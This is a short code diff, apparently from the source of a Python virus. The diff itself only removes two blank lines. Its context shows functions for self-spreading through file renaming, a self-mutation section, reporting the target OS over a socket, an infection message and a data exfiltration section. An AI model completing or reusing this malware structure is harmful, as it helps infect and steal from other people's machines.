@@ -96,7 +96,6 @@ def spread_self(targeted_file_type, virus):
             os.rename(item, new_file_name)
             print(f"Renamed file to {new_file_name}")
 
-
 # -- Self Mutation Functions -- 
 #region
 
@@ -216,7 +215,6 @@ send_data(s, f"Target OS: '{str(target_os)}'")
 
 # (3) Send infection message.
 post_infection_msg(target_os, infection_message)
-
 
 # (4) Data Exfiltration
 
